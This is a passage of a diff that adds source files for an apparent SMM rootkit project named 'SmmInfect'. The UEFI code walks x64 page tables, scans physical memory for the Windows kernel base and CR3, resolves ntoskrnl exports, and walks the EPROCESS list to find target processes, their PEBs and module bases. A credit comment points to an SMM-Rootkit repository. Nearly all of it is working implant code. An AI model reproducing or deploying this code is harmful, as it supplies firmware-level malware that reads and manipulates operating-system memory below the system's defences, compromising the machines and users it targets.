+	v3 = ReadPhysical64((v2 & 0xFFFFFFFFF000) + 8 * ((address >> 30) & 0x1FF));
+	if (!v3 || (v3 & 1) == 0)
+		return 0;
+
+	if ((v3 & 0x80u) != 0)
+		return (address & 0x3FFFFFFF) + (v3 & 0xFFFFFFFFF000);
+
+	v5 = ReadPhysical64((v3 & 0xFFFFFFFFF000) + 8 * ((address >> 21) & 0x1FF));
+	if (!v5 || (v5 & 1) == 0)
+		return 0;
+
+	if ((v5 & 0x80u) != 0)
+		return (address & 0x1FFFFF) + (v5 & 0xFFFFFFFFF000);
+
+	v6 = ReadPhysical64((v5 & 0xFFFFFFFFF000) + 8 * ((address >> 12) & 0x1FF));
+	if (v6 && (v6 & 1) != 0)
+		return (address & 0xFFF) + (v6 & 0xFFFFFFFFF000);
+
+	return 0;
+}
+
+// credits rain / hermes.(i belive its h33p's code actually) project for finding ntoskrnl and cr3. https://github.com/jussihi/SMM-Rootkit/tree/master
+BOOLEAN p_memCpy(UINT64 dest, UINT64 src, UINTN n, BOOLEAN verbose)
+{
+	if ((IsAddressValid((UINT64)src) == FALSE || IsAddressValid((UINT64)(src + n - 1)) == FALSE))
+	{
+		return FALSE;
+	}
+
+	CHAR8* csrc = (char*)src;
+	CHAR8* cdest = (char*)dest;
+
+	for (INT32 i = 0; i < n; i++)
+		cdest[i] = csrc[i];
+
+	return TRUE;
+}
+
+STATIC BOOLEAN CheckLow(UINT64* pml4, UINT64* kernel_entry)
+{
+	UINT64 o = 0;
+	while (o < 0x100000)
+	{
+		o += 0x1000;
+
+		if (IsAddressValid(o) == TRUE)
+		{
+			if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)(void*)(o + 0x000)))
+			{
+				continue;
+			}
+			if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(void*)(o + 0x070)))
+			{
+				continue;
+			}
+			if (0xffffff0000000fff & *(UINT64*)(void*)(o + 0x0a0))
+			{
+				continue;
+			}
+
+			p_memCpy((UINT64)pml4, (UINT64)o + 0xa0, 8, FALSE);
+			p_memCpy((UINT64)kernel_entry, (UINT64)o + 0x70, 8, FALSE);
+
+			return TRUE;
+		}
+	}
+	return FALSE;
+}
+
+EFI_STATUS MemGetKernelBase(UINT64* base)
+{
+	if (base == NULL)
+	{
+		return EFI_INVALID_PARAMETER;
+	}
+
+	UINT64 cr3 = 0;
+	UINT64 kernel_entry = 0;
+	CheckLow(&cr3, &kernel_entry);
+
+	UINT64 physical_first = 0;
+	physical_first = TranslateVirtualToPhysical(cr3, kernel_entry & 0xFFFFFFFFFF000000);
+
+	if (IsAddressValid(physical_first) == TRUE && physical_first != 0)
+	{
+		if (((kernel_entry & 0xFFFFFFFFFF000000) & 0xfffff) == 0 && *(INT16*)(VOID*)(physical_first) == 0x5a4d)
+		{
+			INT32 kdbg = 0, pool_code = 0;
+			for (INT32 u = 0; u < 0x1000; u++)
+			{
+				kdbg = kdbg || *(UINT64*)(VOID*)(physical_first + u) == 0x4742444b54494e49;
+				pool_code = pool_code || *(UINT64*)(VOID*)(physical_first + u) == 0x45444f434c4f4f50;
+				if (kdbg & pool_code)
+				{
+					*base = kernel_entry & 0xFFFFFFFFFF000000;
+					return EFI_SUCCESS;
+				}
+			}
+		}
+	}
+
+	UINT64 physical_sec = 0;
+	physical_sec = TranslateVirtualToPhysical(cr3, (kernel_entry & 0xFFFFFFFFFF000000) + 0x2000000);
+
+	if (IsAddressValid(physical_sec) == TRUE && physical_sec != 0)
+	{
+		if ((((kernel_entry & 0xFFFFFFFFFF000000) + 0x2000000) & 0xfffff) == 0 && *(INT16*)(VOID*)(physical_sec) == 0x5a4d)
+		{
+			INT32 kdbg = 0, pool_code = 0;
+			for (INT32 u = 0; u < 0x1000; u++)
+			{
+				kdbg = kdbg || *(UINT64*)(VOID*)(physical_sec + u) == 0x4742444b54494e49;
+				pool_code = pool_code || *(UINT64*)(VOID*)(physical_sec + u) == 0x45444f434c4f4f50;
+				if (kdbg & pool_code)
+				{
+					*base = (kernel_entry & 0xFFFFFFFFFF000000) + 0x2000000;
+					return EFI_SUCCESS;
+				}
+			}
+		}
+	}
+
+	UINT64 i, p, u, mask = 0xfffff;
+
+	while (mask >= 0xfff)
+	{
+		for (i = (kernel_entry & ~0x1fffff) + 0x10000000; i > kernel_entry - 0x20000000; i -= 0x200000)
+		{
+			for (p = 0; p < 0x200000; p += 0x1000)
+			{
+
+				UINT64 physical_p = 0;
+				physical_p = TranslateVirtualToPhysical(cr3, i + p);
+
+				if (IsAddressValid(physical_p) == TRUE && physical_p != 0)
+				{
+					if (((i + p) & mask) == 0 && *(INT16*)(VOID*)(physical_p) == 0x5a4d)
+					{
+						INT32 kdbg = 0, poolCode = 0;
+						for (u = 0; u < 0x1000; u++)
+						{
+							if (IsAddressValid(p + u) == FALSE)
+								continue;
+
+							kdbg = kdbg || *(UINT64*)(VOID*)(physical_p + u) == 0x4742444b54494e49;
+							poolCode = poolCode || *(UINT64*)(VOID*)(physical_p + u) == 0x45444f434c4f4f50;
+							if (kdbg & poolCode)
+							{
+								*base = i + p;
+								return EFI_SUCCESS;
+							}
+						}
+					}
+				}
+			}
+		}
+
+		mask = mask >> 4;
+	}
+	return EFI_NOT_FOUND;
+}
+
+#endif
+#pragma optimize("", on)
+
+```
+
+`SmmInfect/memory.h`:
+
+```h
+#pragma once
+
+#include <Uefi.h>
+#include <Library/UefiLib.h>
+#include <Library/DebugLib.h>
+#include <Library/MemoryAllocationLib.h>
+#include <Library/UefiBootServicesTableLib.h>
+#include <Protocol/SmmCpu.h>
+#include <Protocol/SmmBase2.h>
+#include <Protocol/SmmAccess2.h>
+#include <Protocol/SmmSwDispatch2.h>
+#include <Protocol/SmmPeriodicTimerDispatch2.h>
+#include <Protocol/SmmUsbDispatch2.h>
+#include <Library/UefiRuntimeServicesTableLib.h>
+#include <Library/DevicePathLib.h>
+#include <Library/PrintLib.h>
+#include <Protocol/SimpleFileSystem.h>
+#include <Protocol/LoadedImage.h>
+#include <IndustryStandard/PeImage.h>
+#include <Guid/GlobalVariable.h>
+
+EFI_RUNTIME_SERVICES* gRT;
+EFI_BOOT_SERVICES* gBS;
+EFI_SYSTEM_TABLE* gST;
+
+#define Windows
+// #define Linux UNSUPPORTED
+EFI_SMM_SYSTEM_TABLE2* gSmst2;
+
+void* ZMemSet(void* ptr, int value, UINT64 num);
+BOOLEAN IsAddressValid(UINT64 address);
+
+//
+// Physical memory
+//
+UINT8* ReadPhysical(UINT64 address, UINT8* buffer, UINT64 length);
+UINT8 ReadPhysical8(UINT64 address);
+UINT16 ReadPhysical16(UINT64 address);
+UINT32 ReadPhysical32(UINT64 address);
+UINT64 ReadPhysical64(UINT64 address);
+
+//
+// Virtual memory
+//
+UINT8* ReadVirtual(UINT64 address, UINT64 cr3, UINT8* buffer, UINT64 length);
+UINT8 ReadVirtual8(UINT64 address, UINT64 cr3);
+UINT16 ReadVirtual16(UINT64 address, UINT64 cr3);
+UINT32 ReadVirtual32(UINT64 address, UINT64 cr3);
+UINT64 ReadVirtual64(UINT64 address, UINT64 cr3);
+
+//
+// Windows kernel
+//
+#ifdef Windows
+UINT64 TranslateVirtualToPhysical(UINT64 cr3, UINT64 address);
+EFI_STATUS MemGetKernelBase(UINT64* base);
+EFI_STATUS MemGetKernelCr3(UINT64* cr3);
+EFI_STATUS SetupMemoryMap();
+#endif
+
+//
+// Linux kernel.
+//
+#ifdef Linux
+UINT64 TranslateVirtualToPhysical(UINT64 cr3, UINT64 address);
+EFI_STATUS GetKernelBase();
+#endif
+
+```
+
+`SmmInfect/string.c`:
+
+```c
+#include "string.h"
+
+int ToLower(int c)
+{
+	return (c >= 'A' && c <= 'Z') ? (c + 'a' - 'A') : c;
+}
+
+int StrCmpi(const char* str1, const char* str2)
+{
+	while (*str1 && (ToLower(*str1) == ToLower(*str2)))
+	{
+		str1++;
+		str2++;
+	}
+	return *(const unsigned char*)str1 - *(const unsigned char*)str2;
+}
+
+int WcsCmpi(const unsigned short* str1, const unsigned short* str2)
+{
+	while (*str1 && (ToLower(*str1) == ToLower(*str2)))
+	{
+		str1++;
+		str2++;
+	}
+	return *(const unsigned short*)str1 - *(const unsigned short*)str2;
+}
+```
+
+`SmmInfect/string.h`:
+
+```h
+int ToLower(int c);
+int StrCmpi(const char* str1, const char* str2);
+int WcsCmpi(const unsigned short* str1, const unsigned short* str2);
+```
+
+`SmmInfect/windows.c`:
+
+```c
+#include "windows.h"
+
+#pragma optimize("", off)
+
+UINT64 KernelCr3 = 0;
+UINT64 KernelBase = 0;
+UINT64 PsInitialSystemProcess;
+UINT64 PsGetProcessExitProcessCalled = 0;
+UINT64 PsGetProcessImageFileName = 0;
+UINT64 ActiveProcessLinks = 0;
+UINT64 PsGetProcessPeb = 0;
+UINT64 PsGetProcessSectionBaseAddress = 0;
+BOOLEAN SetupDone = FALSE;
+EFI_STATUS SetupWindows();
+
+UINT64 ZGetProcAddressX64(UINT64 cr3, UINT64 base, const char* export_name)
+{
+	INT64 v4;
+	UINT32 v5;
+	UINT32* v6;
+	INT64 v7;
+	UINT32* v8;
+	UINT32 v9;
+	INT64 v10;
+
+	if (ReadVirtual16(base, cr3) != 23117)
+	{
+		return 0;
+	}
+
+	v4 = ReadVirtual32(base + 60, cr3);
+	if (ReadVirtual32(v4 + base, cr3) != 17744)
+	{
+		return 0;
+	}
+
+	v5 = 0;
+	v6 = (UINT32*)(base + ReadVirtual32(v4 + base + 136, cr3));
+	v7 = base + (UINT32)ReadVirtual32((UINT64)v6 + sizeof(UINT32) * 7, cr3);
+	v8 = (UINT32*)(base + (UINT32)ReadVirtual32((UINT64)v6 + sizeof(UINT32) * 8, cr3));
+	v9 = ReadVirtual32((UINT64)v6 + sizeof(UINT32) * 6, cr3);
+	v10 = base + (UINT32)ReadVirtual32((UINT64)v6 + sizeof(UINT32) * 9, cr3);
+	if (!v9)
+	{
+		return 0;
+	}
+
+	unsigned char name[50] = { 0 };
+
+	ReadVirtual(base + ReadVirtual32((UINT64)v8, cr3), cr3, (UINT8*)name, (UINT64)sizeof(name));
+	name[49] = 0;
+
+	while (StrCmpi((char*)name, export_name))
+	{
+		++v5;
+		++v8;
+		if (v5 >= v9)
+		{
+			return 0;
+		}
+
+		ReadVirtual(base + (UINT64)ReadVirtual32((UINT64)v8, cr3), cr3, (UINT8*)name, (UINT64)sizeof(name));
+		name[49] = 0;
+	}
+	return base + ReadVirtual32(v7 + 4 * ReadVirtual16(v10 + 2 * (INT32)v5, cr3), cr3);
+}
+
+UINT64 GetBaseAddressModuleX64(UINT64 eprocess, unsigned short* process_name)
+{
+	UINT64* v3;
+	UINT64* i;
+
+	UINT64 cr3 = GetProcessCr3(eprocess);
+	UINT64 a1 = GetProcessPEB(eprocess);
+
+	v3 = (UINT64*)((UINT64)ReadVirtual64(a1 + 24, cr3) + 32);
+	for (i = (UINT64*)ReadVirtual64((UINT64)v3, cr3);; i = (UINT64*)ReadVirtual64((UINT64)i, cr3))
+	{
+		if (i == v3)
+		{
+			return 0;
+		}
+
+		unsigned short name[30];
+		ReadVirtual(ReadVirtual64((UINT64)i + (UINT64)sizeof(UINT64) * 10, cr3), cr3, (UINT8*)name, sizeof(name));
+
+		if (!(unsigned int)WcsCmpi(name, process_name))
+		{
+			break;
+		}
+	}
+
+	return ReadVirtual64((UINT64)i + sizeof(UINT64) * 4, cr3);
+}
+
+UINT64 GetSectionBaseAddressX64(UINT64 eprocess, UINT64 module_base, unsigned char* section_name)
+{
+	INT64 v4;
+	INT32 v5;
+	INT32 v6;
+	INT64 v7;
+	UINT64 cr3 = GetProcessCr3(eprocess);
+
+	if (ReadVirtual16(module_base, cr3) != 23117)
+		return 0;
+	v4 = module_base + ReadVirtual32(module_base + 60, cr3);
+	if (ReadVirtual32(v4, cr3) != 17744)
+		return 0;
+	v5 = 0;
+	v6 = ReadVirtual16(v4 + 6, cr3);
+	v7 = v4 + ReadVirtual16(v4 + 20, cr3) + 24;
+	if (!ReadVirtual16(v4 + 6, cr3))
+		return 0;
+
+	char* name[8] = { 0 };
+	ReadVirtual(v7, cr3, (UINT8*)name, sizeof(name));
+	while (StrCmpi((const char*)name, (const char*)section_name))
+	{
+		++v5;
+		v7 += 40;
+		if (v5 >= v6)
+			return 0;
+
+		ReadVirtual(v7, cr3, (UINT8*)name, sizeof(name));
+	}
+	return module_base + ReadVirtual32(v7 + 12, cr3);
+}
+
+UINT64 GetKernelBase()
+{
+	if (EFI_ERROR(SetupWindows()))
+	{
+		return 0;
+	}
+
+	return KernelBase;
+}
+
+UINT64 GetKernelCr3()
+{
+	if (EFI_ERROR(SetupWindows()))
+	{
+		return 0;
+	}
+
+	return KernelCr3;
+}
+
+UINT64 GetProcessCr3(UINT64 eprocess)
+{
+	// _EPROCESS -> _KPROCESS -> 0x28;
+	return ReadVirtual64(eprocess + 0x28, KernelCr3);
+}
+
+UINT64 GetProcessPEB(UINT64 eprocess)
+{
+	return ReadVirtual64(eprocess + PsGetProcessPeb, KernelCr3);
+}
+
+UINT64 GetProcessBaseAddress(UINT64 eprocess)
+{
+	return ReadVirtual64(eprocess + PsGetProcessSectionBaseAddress, KernelCr3);
+}
+
+EFI_STATUS SetupWindows()
+{
+	if (SetupDone == TRUE)
+	{
+		return EFI_SUCCESS;
+	}
+
+	EFI_STATUS status = MemGetKernelCr3(&KernelCr3);
+	if (EFI_ERROR(status))
+	{
+		return EFI_NOT_FOUND;
+	}
+
+	status = MemGetKernelBase(&KernelBase);
+	if (EFI_ERROR(status))
+	{
+		return EFI_NOT_FOUND;
+	}
+
+	PsInitialSystemProcess = ZGetProcAddressX64(KernelCr3, KernelBase, "PsInitialSystemProcess");
+	if (PsInitialSystemProcess == 0)
+	{
+		return EFI_NOT_FOUND;
+	}
+
+	PsGetProcessSectionBaseAddress = ReadVirtual32(ZGetProcAddressX64(KernelCr3, KernelBase, "PsGetProcessSectionBaseAddress") + 3, KernelCr3);
+	PsGetProcessExitProcessCalled = ReadVirtual32(ZGetProcAddressX64(KernelCr3, KernelBase, "PsGetProcessExitProcessCalled") + 2, KernelCr3);
+	PsGetProcessImageFileName = ReadVirtual32(ZGetProcAddressX64(KernelCr3, KernelBase, "PsGetProcessImageFileName") + 3, KernelCr3);
+	ActiveProcessLinks = ReadVirtual32(ZGetProcAddressX64(KernelCr3, KernelBase, "PsGetProcessId") + 3, KernelCr3) + 8;
+	PsGetProcessPeb = ReadVirtual32(ZGetProcAddressX64(KernelCr3, KernelBase, "PsGetProcessPeb") + 3, KernelCr3);
+
+	if (!PsInitialSystemProcess || !PsGetProcessExitProcessCalled || !PsGetProcessImageFileName || !ActiveProcessLinks || !PsGetProcessPeb || !PsGetProcessSectionBaseAddress)
+	{
+		return EFI_NOT_FOUND;
+	}
+
+	SetupDone = TRUE;
+	return EFI_SUCCESS;
+}
+
+// credits ekknod
+UINT64 GetEProcess(const char* process_name)
+{
+
+	if (EFI_ERROR(SetupWindows()))
+	{
+		return 0;
+	}
+
+	UINT64 entry;
+	char name[15] = { 0 };
+
+	UINT64 proc = ReadVirtual64(PsInitialSystemProcess, KernelCr3);
+	entry = proc;
+	do
+	{
+		ReadVirtual(entry + PsGetProcessImageFileName, KernelCr3, name, 15);
+		name[14] = 0;
+
+		UINT32 exitcalled = ReadVirtual32(entry + PsGetProcessExitProcessCalled, KernelCr3);
+		exitcalled = exitcalled >> 2;
+		exitcalled = exitcalled & 1;
+
+		if (!exitcalled && !StrCmpi(name, process_name))
+			return entry;
+
+		entry = ReadVirtual64(entry + ActiveProcessLinks, KernelCr3);
+		if (entry == 0)
+			break;
+
+		entry = entry - ActiveProcessLinks;
+
+	} while (entry != proc);
+	return 0;
+}
+
+#pragma optimize("", on)
+
+```
+
+`SmmInfect/windows.h`:
+
+```h
+#pragma once
+#include "memory.h"
+#include "string.h"
+
+UINT64 ZGetProcAddressX64(UINT64 cr3, UINT64 base, const char* export_name);
+UINT64 GetEProcess(const char* process_name);
+UINT64 GetBaseAddressModuleX64(UINT64 eprocess, unsigned short* process_name);
+UINT64 GetSectionBaseAddressX64(UINT64 eprocess, UINT64 module_base, unsigned char* section_name);
+
+UINT64 GetKernelBase();
+UINT64 GetKernelCr3();
+
+UINT64 GetProcessCr3(UINT64 eprocess);
+UINT64 GetProcessPEB(UINT64 eprocess);
+UINT64 GetProcessBaseAddress(UINT64 eprocess);
+
+```
